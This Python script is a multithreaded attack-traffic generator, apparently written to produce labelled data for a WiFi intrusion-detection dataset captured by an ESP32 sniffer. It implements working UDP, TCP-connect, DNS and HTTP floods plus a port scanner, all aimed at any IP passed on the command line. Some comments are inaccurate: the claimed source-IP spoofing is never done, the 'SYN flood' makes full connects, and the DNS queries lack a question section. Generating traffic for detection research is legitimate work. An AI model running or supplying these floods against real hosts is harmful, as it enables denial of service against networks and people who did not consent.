#!/usr/bin/env python3
"""
WiFi Attack Traffic Generator
Generates various types of attack traffic for dataset labeling
Works in parallel with ESP32 packet sniffer to capture attacks

Attack Types:
- TCP SYN Flood: High-speed SYN packets to exhaust resources
- UDP Flood: High-speed UDP packets to targets
- Port Scan: Systematic port enumeration
- DNS Query Flood: Excessive DNS queries
- HTTP Flood: Multiple HTTP requests
"""

import socket
import threading
import time
import random
import sys
from datetime import datetime
from typing import List, Tuple

class AttackGenerator:
    """Generates various network attacks for dataset creation"""
    
    ATTACK_TYPES = ['syn_flood', 'udp_flood', 'port_scan', 'dns_flood', 'http_flood']
    
    def __init__(self, target_ip='192.168.1.1', target_ports: List[int] = None, duration: int = 600):
        """
        Initialize attack generator
        
        Args:
            target_ip: Target IP address (default gateway or test server)
            target_ports: List of target ports
            duration: Duration of attacks in seconds
        """
        self.target_ip = target_ip
        self.target_ports = target_ports or [80, 443, 22, 21, 25, 53, 3306, 5432]
        self.duration = duration
        self.start_time = None
        self.stop_flag = False
        self.attack_count = 0
        self.threads = []
        
    def log(self, message: str, level: str = "INFO"):
        """Print timestamped log message"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def syn_flood(self, target_ip: str, target_port: int, duration: int):
        """
        Simulate TCP SYN flood attack
        Sends rapid SYN packets to target port
        """
        self.log(f"Starting SYN flood to {target_ip}:{target_port}")
        
        packets_sent = 0
        start = time.time()
        
        try:
            while time.time() - start < duration and not self.stop_flag:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    
                    # Spoof source IP variations to simulate multiple attackers
                    sock.connect_ex((target_ip, target_port))
                    packets_sent += 1
                    
                    if packets_sent % 100 == 0:
                        self.log(f"SYN flood: {packets_sent} packets sent to {target_ip}:{target_port}")
                    
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
        
        except Exception as e:
            self.log(f"SYN flood error: {e}", "ERROR")
        
        self.log(f"SYN flood completed: {packets_sent} packets to {target_ip}:{target_port}")
    
    def udp_flood(self, target_ip: str, target_port: int, duration: int):
        """
        Simulate UDP flood attack
        Sends high-speed UDP packets to target
        """
        self.log(f"Starting UDP flood to {target_ip}:{target_port}")
        
        packets_sent = 0
        start = time.time()
        payload = b"X" * 512  # 512-byte payload
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while time.time() - start < duration and not self.stop_flag:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    packets_sent += 1
                    
                    if packets_sent % 500 == 0:
                        self.log(f"UDP flood: {packets_sent} packets sent to {target_ip}:{target_port}")
                
                except:
                    pass
        
        except Exception as e:
            self.log(f"UDP flood error: {e}", "ERROR")
        finally:
            try:
                sock.close()
            except:
                pass
        
        self.log(f"UDP flood completed: {packets_sent} packets to {target_ip}:{target_port}")
    
    def port_scan(self, target_ip: str, ports: List[int], duration: int):
        """
        Simulate port scan attack
        Attempts connections to multiple ports in sequence
        """
        self.log(f"Starting port scan on {target_ip} ({len(ports)} ports)")
        
        scan_count = 0
        start = time.time()
        
        try:
            while time.time() - start < duration and not self.stop_flag:
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((target_ip, port))
                        sock.close()
                        
                        scan_count += 1
                        if result == 0:
                            self.log(f"Port scan: {target_ip}:{port} is OPEN")
                        
                    except:
                        pass
                    
                    if self.stop_flag:
                        break
        
        except Exception as e:
            self.log(f"Port scan error: {e}", "ERROR")
        
        self.log(f"Port scan completed: {scan_count} ports scanned")
    
    def dns_flood(self, target_ip: str, duration: int):
        """
        Simulate DNS query flood attack
        Sends many DNS queries to target
        """
        self.log(f"Starting DNS flood to {target_ip}:53")
        
        queries_sent = 0
        start = time.time()
        
        # Common domains to query
        domains = [
            b'google.com', b'facebook.com', b'youtube.com', b'wikipedia.org',
            b'twitter.com', b'linkedin.com', b'github.com', b'amazon.com',
            b'example.com', b'test.com', b'localhost.com', b'invalid.test'
        ]
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while time.time() - start < duration and not self.stop_flag:
                try:
                    # Simple DNS query format
                    domain = random.choice(domains)
                    query_id = random.randint(1, 65535)
                    
                    # Minimal DNS request header
                    dns_request = bytes([
                        (query_id >> 8) & 0xFF, query_id & 0xFF,  # ID
                        0x01, 0x00,  # Standard query
                        0x00, 0x01,  # Questions
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # Answers, Auth, Additional
                    ])
                    
                    sock.sendto(dns_request, (target_ip, 53))
                    queries_sent += 1
                    
                    if queries_sent % 200 == 0:
                        self.log(f"DNS flood: {queries_sent} queries sent to {target_ip}")
                
                except:
                    pass
        
        except Exception as e:
            self.log(f"DNS flood error: {e}", "ERROR")
        finally:
            try:
                sock.close()
            except:
                pass
        
        self.log(f"DNS flood completed: {queries_sent} queries to {target_ip}")
    
    def http_flood(self, target_url: str, duration: int):
        """
        Simulate HTTP flood attack
        Sends many HTTP requests to target
        """
        self.log(f"Starting HTTP flood to {target_url}")
        
        requests_sent = 0
        start = time.time()
        
        try:
            import urllib.request
            import urllib.error
            
            while time.time() - start < duration and not self.stop_flag:
                try:
                    request = urllib.request.Request(
                        target_url,
                        headers={'User-Agent': f'Mozilla/5.0 (Attack-{random.randint(1000,9999)})'}
                    )
                    urllib.request.urlopen(request, timeout=1)
                    requests_sent += 1
                    
                except (urllib.error.URLError, urllib.error.HTTPError, Exception):
                    requests_sent += 1  # Count even failed requests
                
                if requests_sent % 10 == 0:
                    self.log(f"HTTP flood: {requests_sent} requests sent to {target_url}")
        
        except Exception as e:
            self.log(f"HTTP flood error: {e}", "ERROR")
        
        self.log(f"HTTP flood completed: {requests_sent} requests to {target_url}")
    
    def start_attacks(self, attack_types: List[str] = None, parallel: bool = True):
        """
        Start attack generation
        
        Args:
            attack_types: List of attack types to execute
            parallel: Run attacks in parallel (True) or sequential (False)
        """
        if attack_types is None:
            attack_types = ['syn_flood', 'udp_flood', 'port_scan', 'dns_flood']
        
        self.start_time = time.time()
        self.stop_flag = False
        
        print("\n" + "="*60)
        print("ATTACK TRAFFIC GENERATION")
        print("="*60)
        self.log(f"Target IP: {self.target_ip}")
        self.log(f"Duration: {self.duration} seconds")
        self.log(f"Attack types: {', '.join(attack_types)}")
        self.log(f"Parallel execution: {parallel}")
        print("="*60 + "\n")
        
        try:
            if parallel:
                self._start_parallel_attacks(attack_types)
            else:
                self._start_sequential_attacks(attack_types)
        
        except KeyboardInterrupt:
            self.log("Attacks interrupted by user", "WARNING")
            self.stop_flag = True
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join(timeout=5)
        
        self._print_summary()
    
    def _start_parallel_attacks(self, attack_types: List[str]):
        """Execute attacks in parallel"""
        
        for attack_type in attack_types:
            if attack_type == 'syn_flood':
                for port in self.target_ports[:3]:
                    t = threading.Thread(
                        target=self.syn_flood,
                        args=(self.target_ip, port, self.duration)
                    )
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
            
            elif attack_type == 'udp_flood':
                for port in self.target_ports[3:6]:
                    t = threading.Thread(
                        target=self.udp_flood,
                        args=(self.target_ip, port, self.duration)
                    )
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
            
            elif attack_type == 'port_scan':
                t = threading.Thread(
                    target=self.port_scan,
                    args=(self.target_ip, self.target_ports, self.duration)
                )
                t.daemon = True
                t.start()
                self.threads.append(t)
            
            elif attack_type == 'dns_flood':
                t = threading.Thread(
                    target=self.dns_flood,
                    args=(self.target_ip, self.duration)
                )
                t.daemon = True
                t.start()
                self.threads.append(t)
            
            elif attack_type == 'http_flood':
                t = threading.Thread(
                    target=self.http_flood,
                    args=(f"http://{self.target_ip}", self.duration)
                )
                t.daemon = True
                t.start()
                self.threads.append(t)
        
        # Wait for duration or until stopped
        time.sleep(self.duration)
        self.stop_flag = True
    
    def _start_sequential_attacks(self, attack_types: List[str]):
        """Execute attacks sequentially"""
        
        per_attack_duration = max(30, self.duration // len(attack_types))
        
        for attack_type in attack_types:
            if self.stop_flag:
                break
            
            if attack_type == 'syn_flood':
                self.syn_flood(self.target_ip, self.target_ports[0], per_attack_duration)
            
            elif attack_type == 'udp_flood':
                self.udp_flood(self.target_ip, self.target_ports[1], per_attack_duration)
            
            elif attack_type == 'port_scan':
                self.port_scan(self.target_ip, self.target_ports[:10], per_attack_duration)
            
            elif attack_type == 'dns_flood':
                self.dns_flood(self.target_ip, per_attack_duration)
            
            elif attack_type == 'http_flood':
                self.http_flood(f"http://{self.target_ip}", per_attack_duration)
    
    def _print_summary(self):
        """Print attack generation summary"""
        elapsed = time.time() - self.start_time
        
        print("\n" + "="*60)
        print("ATTACK GENERATION COMPLETE")
        print("="*60)
        self.log(f"Total duration: {int(elapsed)} seconds")
        self.log(f"Attacks completed. ESP32 should have captured attack flows.")
        print("="*60 + "\n")


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Generate attack traffic for WiFi security dataset'
    )
    parser.add_argument('--target', default='192.168.1.1', help='Target IP address')
    parser.add_argument('--ports', default='80,443,22,21,25,53,3306,5432', 
                       help='Comma-separated target ports')
    parser.add_argument('--duration', type=int, default=600, 
                       help='Attack duration in seconds (default: 600)')
    parser.add_argument('--attacks', default='syn_flood,udp_flood,port_scan,dns_flood',
                       help='Comma-separated attack types')
    parser.add_argument('--sequential', action='store_true',
                       help='Run attacks sequentially instead of parallel')
    
    args = parser.parse_args()
    
    # Parse ports
    try:
        ports = [int(p.strip()) for p in args.ports.split(',')]
    except ValueError:
        print("[-] Invalid port format. Use comma-separated integers.")
        sys.exit(1)
    
    # Parse attack types
    attacks = [a.strip() for a in args.attacks.split(',')]
    
    # Validate attack types
    valid_attacks = AttackGenerator.ATTACK_TYPES
    for attack in attacks:
        if attack not in valid_attacks:
            print(f"[-] Unknown attack type: {attack}")
            print(f"[*] Valid types: {', '.join(valid_attacks)}")
            sys.exit(1)
    
    # Create and start generator
    generator = AttackGenerator(
        target_ip=args.target,
        target_ports=ports,
        duration=args.duration
    )
    
    generator.start_attacks(
        attack_types=attacks,
        parallel=not args.sequential
    )


if __name__ == '__main__':
    main()
